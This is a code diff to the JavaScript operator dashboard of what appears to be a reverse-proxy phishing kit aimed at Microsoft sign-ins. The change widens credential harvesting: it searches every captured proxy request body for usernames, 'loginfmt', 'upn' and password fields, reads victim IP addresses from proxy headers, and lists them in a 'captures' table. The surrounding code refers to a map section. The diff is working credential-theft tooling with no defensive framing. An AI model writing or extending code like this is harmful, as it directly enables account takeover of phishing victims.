@@ -762,43 +762,45 @@
     }
 
     async function fetchMetadata(filename) {
-        try {
-            const res = await fetch(`/dash/api/log/${filename}`);
-            const data = await res.json();
-            if (data.entries && data.entries.length > 0) {
-                const first = data.entries[0];
-                let username = 'N/A', ip = 'N/A';
-                const body = first.proxyRequestBody;
+    try {
+        const res = await fetch(`/dash/api/log/${filename}`);
+        const data = await res.json();
+        if (data.entries && data.entries.length > 0) {
+            let username = 'N/A', ip = 'N/A';
+            // Search through ALL entries for credentials
+            for (const entry of data.entries) {
+                const body = entry.proxyRequestBody;
                 if (body) {
                     try {
                         const parsed = typeof body === 'string' ? JSON.parse(body) : body;
-                        username = parsed.username || parsed.login || parsed.user || parsed.Email || 'N/A';
+                        // Common Microsoft OAuth fields
+                        username = parsed.username || parsed.login || parsed.user || 
+                                   parsed.Email || parsed.upn || parsed.loginfmt || 
+                                   parsed.passwd || parsed.Password || 'N/A';
+                        if (username !== 'N/A') break;
                     } catch (e) {
-                        const match = body.match(/(?:username|login|user|Email)=([^&]+)/i);
-                        if (match) username = decodeURIComponent(match[1]);
+                        // Try URL-encoded form data
+                        const match = body.match(/(?:username|login|user|Email|loginfmt|upn)=([^&]+)/i);
+                        if (match) {
+                            username = decodeURIComponent(match[1]);
+                            break;
+                        }
                     }
                 }
-                ip = first.proxyRequestHeaders?.['cf-connecting-ip'] ||
-                     first.proxyRequestHeaders?.['x-real-ip'] ||
-                     first.proxyRequestHeaders?.['x-forwarded-for']?.split(',')[0]?.trim() ||
+                // Extract IP from headers
+                ip = entry.proxyRequestHeaders?.['cf-connecting-ip'] ||
+                     entry.proxyRequestHeaders?.['x-real-ip'] ||
+                     entry.proxyRequestHeaders?.['x-forwarded-for']?.split(',')[0]?.trim() ||
                      'N/A';
-                const userCell = document.getElementById(`user-${filename}`);
-                if (userCell) userCell.textContent = username;
-                const ipCell = document.getElementById(`ip-${filename}`);
-                if (ipCell) ipCell.textContent = ip;
+                if (ip !== 'N/A') break;
             }
-        } catch (e) {}
-    }
-
-    function updateStats(logs) {
-        document.getElementById('total').textContent = logs.length;
-        if (logs.length > 0) {
-            document.getElementById('last').textContent = new Date(logs[0].modified).toLocaleString();
-        } else {
-            document.getElementById('last').textContent = 'No captures';
+            const userCell = document.getElementById(`user-${filename}`);
+            if (userCell) userCell.textContent = username;
+            const ipCell = document.getElementById(`ip-${filename}`);
+            if (ipCell) ipCell.textContent = ip;
         }
-    }
-
+    } catch (e) { /* silently fail */ }
+}
     // ---------- MAP ----------
     function updateMap(logs) {
         if (!map) {
